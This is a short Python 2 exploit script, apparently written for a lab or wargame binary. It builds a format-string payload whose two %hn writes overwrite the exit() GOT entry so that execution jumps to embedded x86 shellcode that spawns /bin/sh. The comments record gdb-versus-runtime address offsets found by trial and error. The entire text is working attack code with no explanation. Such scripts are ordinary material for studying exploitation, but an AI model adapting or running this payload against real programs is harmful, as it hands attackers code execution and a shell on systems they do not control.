import struct

exit_got_plt_addr = 0x080499b8
# shellcode_addr = 0xbffff698 in gdb
# shellcode_addr = 0xbffff678 out of gdb
shellcode = "\x31\xC0\x83\xEC\x04\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x83\xEC\x04\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x89\xE1\xB0\x0B\xCD\x80"


s = ""
s += struct.pack("<L", exit_got_plt_addr)
s += struct.pack("<L", exit_got_plt_addr+2)
distance = 0xbfff - len(s) # Calculate how much more we need to print to write correct value
s += "%{}X".format(distance)
s += "%7$hn"
distance = 0x3699 # Through trial and error got this offset to write "f698"
distance = 0x3679 # 0x20 bytes difference when not in gdb for me.
s += "%{}X".format(distance)
s += "%6$hn"
s += shellcode

print s
